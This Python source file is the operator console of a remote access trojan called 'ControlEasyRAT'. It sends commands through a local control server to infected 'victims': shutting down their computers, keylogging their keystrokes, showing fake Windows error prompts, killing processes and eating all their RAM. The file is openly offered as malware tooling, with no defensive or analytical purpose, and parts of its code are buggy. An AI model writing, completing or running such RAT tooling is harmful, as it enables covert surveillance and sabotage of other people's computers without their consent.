import requests
import colorama
import json
import random
import string
from time import sleep
from os import system

req = requests.Session()

class console():
    def __init__(self):
        self.auth_key_ = open('authkey.json', 'r')
        self.auth_key = json.load(self.auth_key_)

    def success(self):
        print('Success')

    def failed(self):
        print(f"Something went wrong on connecting to the local Server's API. Please check the Server.")

    def main(self):
        print(self.auth_key_.readlines())
        if self.auth_key['auth_key'] == "":
            key = input('It seems like this is your first time use in ControlEasyRAT!\n You have to either generate an authentification key or type one in.\nDo not worry you do not have to use this unless you are a developer.\nType yes for a generated key or something else as your authkey.  : ')
            if key == 'yes':
                new_auth_key = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(30))
                self.auth_key['auth_key'] = new_auth_key
                json.dump(self.auth_key, open('authkey.json', 'w'))
                print(f'Your new authentification key is {new_auth_key}!')
            else:
                self.auth_key['auth_key'] = key
                json.dump(self.auth_key, open('authkey.json', 'w'))
                print(f'Your new authentification key is {key}!')
        choice = input('ControlEasyRAT < ')

        if choice == "help":
            print('help - Shows commands\nshutdown - Shutdowns the vicims computer\ndestroy - Disconnects all clients from the server\nplay - Plays something on the vicims computer\nkeylogger - Keylogs almost every key the victim presses\nshow_message - Shows a Windows Error prompt with your message\nterminate - Terminates a specific process\nslow_comp - Eats all the ram of the vicims computer') 
            self.main()

        elif choice == 'shutdown':
            try:
                self.check(req.get(f"http://localhost:5000/{self.auth_key['auth_key']}/shutdown"))
            except:
                self.failed()
                self.main()
            

        elif choice == "destroy":
            try:
                self.check(req.get(f"http://localhost:5000/{self.auth_key['auth_key']}/disconnect"))
            except:
                self.failed()
                self.main()

        elif choice == "play":
            try:
                link = input('Put in your video link : ')
                self.check(req.post(f"http://localhost:5000{self.auth_key['auth_key']}/play"), json={'url' : str(link)})
            except:
                self.failed()
                self.main()

        elif choice == "keylogger":
            try:
                self.check(req.get(f"http://localhost:5000/{self.auth_key['auth_key']}/keylogger"))
            except:
                self.failed()
                self.main()
        
        elif choice == "show_message":
            try:
                message_display = input('Message : ')
                self.check(req.post(f"http://localhost:5000/{self.auth_key['auth_key']}/message", json={'msg' : str(message_display)}))
            except:
                self.failed()
                self.main()

        elif choice == "terminate":
            try:
                process = input('Processname  : ')
                self.check(req.post(f"http://localhost:5000/{self.auth_key['auth_key']}/terminate", json={'process' : str(process)}))
            except:
                self.failed()
                self.main()

        elif choice == "slow_comp":
            try:
                self.check(req.get(f"http://localhost:5000/{self.auth_key['auth_key']}/slowcomp"))
            except:
                self.failed()
                self.main()

        else:
            print('Wrong command! Try the help command to list the available commands.')
            self.main()

    def check(self, url):
        if url.status_code == 200:
            self.success()
            self.main()

        else:
            print(url.status_code)
            self.failed()
            self.main()

            

if __name__ == '__main__':
    console().main()